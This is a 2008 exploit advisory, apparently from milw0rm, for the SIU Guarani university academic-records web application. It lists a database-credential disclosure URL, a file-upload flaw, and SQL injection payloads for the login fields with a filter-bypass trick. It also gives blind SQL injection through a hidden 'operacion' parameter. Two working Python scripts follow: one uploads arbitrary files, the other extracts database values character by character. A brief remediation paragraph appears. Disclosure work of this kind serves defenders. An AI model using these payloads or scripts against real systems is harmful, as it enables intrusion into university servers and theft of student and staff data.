@@ -1,0 +1,212 @@
+        #
+    #   #   #
+    ### # ##
+      #####             multiple remote vulnerabilities
+  ############              siu guarani
+     ######
+    ##  #  ##
+        #
+
+
+general information
+-------------------
+bug type	: multiple remote vulnerabilities
+
+software name	: SIU Guarani
+
+vendor		: SIU (www.siu.edu.ar)
+
+authors		: proudhon & Ubik
+
+date		: the 341st day of the year 2008
+
+contact		: N/A
+
+description	: SIU-Guarani is a web application which keeps information about academic activities. It's widely used in Argentina by national 
+universities. for more information, contact the vendor's web page.
+
+disclaimer
+---------
+all the information and code given in this document is provided "as is", for educational purposes only. the authors will not be responsible for any 
+damage.
+
+technical information
+---------------------
+disclosure of database information
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+you can get some of the database information, such as user and password, used by Guarani. this bug is almost fixed by the vendor.
+http://guarani_server/includes/elegirConexion.php
+
+file upload
+^^^^^^^^^^^
+given a valid phpsessid, you can upload files to the server. this bug is fixed in some versions.
+http://guarani_server/a_docentes/subirArchivo.php
+
+sql injection
+^^^^^^^^^^^^^
+http://guarani_server/w_inicial.php
+OR 
+http://guarani_server/inicial.php
+
+Username (Identificacion): ' || (SQL Statement) || '
+Password (Clave): **** (anything)
+
+example:
+Username (Identificacion): ' || DBINFO('dbhostname') || '	
+Password (Clave): **** (anything)
+
+just remember they are using Informix!
+sql injection is partialy solved in some places.
+
+in order to fool some protections, such as "[Informix]An illegal character has been found in the statement.", you can use %27 instead of '.
+
+blind sql injection
+^^^^^^^^^^^^^^^^^^^
+hidden parameter "operacion" in:
+
+http://guarani_server/a_general/verMensajes.php
+http://guarani_server/a_general/autentificarse.php
+
+... and probably more!
+
+example (via POST): http://guarani_server/a_general/verMensajes.php?operacion=op0001' || (case when 10<1 then '1' else '2' end) || '
+
+another example (in autentificarse.php):
+
+operacion=op0001' || (SELECT '1' FROM systables where tabid = 1) || '  
+(no error, because it returns a single value)
+operacion=op0001' || (SELECT '1' FROM systables where tabid <> 1) || ' 
+(error, because there are multiple results)
+
+patchs / work arounds
+---------------------
+among other things, the function which loads the foreign parameters should check for special characters.
+the software itself seems to be pretty buggy, releasing the software code under a license like BSD or GPL would help to improve its security.
+
+proof of concept
+----------------
+file upload
+^^^^^^^^^^^
+#!/bin/python
+# target : SIU Guarani
+# file : 4790
+# quote : "el poporembo como una flor", quintin
+# disclaimer : all the information and code given in this document is provided "as is", for educational purposes only. the authors will not be 
+# responsible for any damage.
+
+import pycurl
+import StringIO
+import sys
+
+if len(sys.argv) < 3:
+  print "SIU guarani file upload"
+  print "usage : " + sys.argv[0] + " <server> <local file>"
+  print "example : " + sys.argv[0] + " someuni.edu.ar/somedir someporn.jpg"
+  sys.exit(1)
+
+print "getting phpsessid.."
+c = pycurl.Curl()
+c.setopt(c.URL, "http://" + sys.argv[1] + "/inicial.php")
+c.setopt(c.COOKIEJAR, "/tmp/guaranicookie")
+c.setopt(c.WRITEFUNCTION, (lambda x : None))
+c.perform()
+c.close()
+
+print "uploading file.."
+r = StringIO.StringIO()
+c = pycurl.Curl()
+c.setopt(c.POST, 1)
+c.setopt(c.URL, "http://" + sys.argv[1] + "/a_docentes/subirArchivo.php")
+c.setopt(c.HTTPPOST, [("archivo", (c.FORM_FILE, sys.argv[2]))])
+c.setopt(c.COOKIEFILE, "/tmp/guaranicookie")
+c.setopt(c.WRITEFUNCTION, r.write)
+c.perform()
+r.seek(0)
+s = r.read()
+r.close()
+c.close()
+s = (s.split("'../library/bajarArchivo.php?qs="))[1]
+s = (s.split("'"))[0]
+print "your download link is http://" + sys.argv[1] + "/library/bajarArchivo.php?qs=" + s
+print "in order to download the file, first you'll need to join http://" + sys.argv[1] + "/ with your web browser"
+# EOF
+
+bind sql injection
+^^^^^^^^^^^^^^^^^^
+#!/bin/python
+# target : SIU Guarani
+# file : 4791
+# quote : "el poporembo como una flor", quintin
+# disclaimer : all the information and code given in this document is provided "as is", for educational purposes only. the authors will not be 
+# responsible for any damage.
+
+import pycurl
+import StringIO
+import sys
+
+def dic_sql(s, i, x, y):
+  num = "SUBSTRING(" + s  + " FROM " + str(i) + " FOR 1)"
+  return "(" + num + " >= '" + chr(x) + "') AND (" + num + " <= '" + chr(y) + "')"
+
+maxsize = 32
+
+if len(sys.argv) < 3:
+  print "SIU guarani blind sql execution"
+  print "usage : " + sys.argv[0] + " <server> <sql string to match> [maxsize=32]"
+  print "example : " + sys.argv[0] + " http://someuni.edu.ar/somedir USER"
+  print "remember, it's an informix database"
+  print "https support!"
+  sys.exit(1)
+
+if len(sys.argv) > 3:
+  maxsize = int(sys.argv[3])
+
+print "getting phpsessid.."
+c = pycurl.Curl()
+
+if (sys.argv[1][0:5] == "https"):
+  c.setopt(c.SSL_VERIFYPEER, 0)
+c.setopt(c.URL, sys.argv[1] + "/inicial.php")
+c.setopt(c.COOKIEJAR, "/tmp/guaranicookie")
+c.setopt(c.WRITEFUNCTION, (lambda x : None))
+c.perform()
+c.close()
+
+print "cracking sql result.."
+
+for l in range(1, maxsize + 1):
+  i = 48
+  f = 125
+  c = pycurl.Curl()
+  r = StringIO.StringIO()
+  if (sys.argv[1][0:5] == "https"):
+    c.setopt(c.SSL_VERIFYPEER, 0)
+  c.setopt(c.POST, 1)
+  c.setopt(c.URL, sys.argv[1] + "/a_general/verMensajes.php")
+  c.setopt(c.COOKIEFILE, "/tmp/guaranicookie")
+  c.setopt(c.WRITEFUNCTION, r.write)
+
+  while i <> f:
+    sql = dic_sql(sys.argv[2], l, i, i+(f-i)/2)
+    c.setopt(c.HTTPPOST, [("operacion", "gda0011' || case when (" + sql + ") then '1' else '2' end || '"), ("ver", "T")])
+    c.perform()
+    r.seek(0)
+    s = r.read()
+    r.truncate(0)
+    if len(s) == 0:
+      print "uhm... looks like a wrong sql string!"
+      sys.exit(1)
+    if len(s.split("No hay mensajes.")) > 1 or len(s.split("Anuncio")) > 1:
+      f = i + (f - i) / 2
+    else:
+      i = i + (f - i) / 2 + 1
+  r.close()
+  c.close()
+  if i == 125:
+    break
+  sys.stdout.write(chr(i))
+  sys.stdout.flush()
+sys.stdout.write('\n')
+# EOF
+
+# milw0rm.com [2008-12-08]
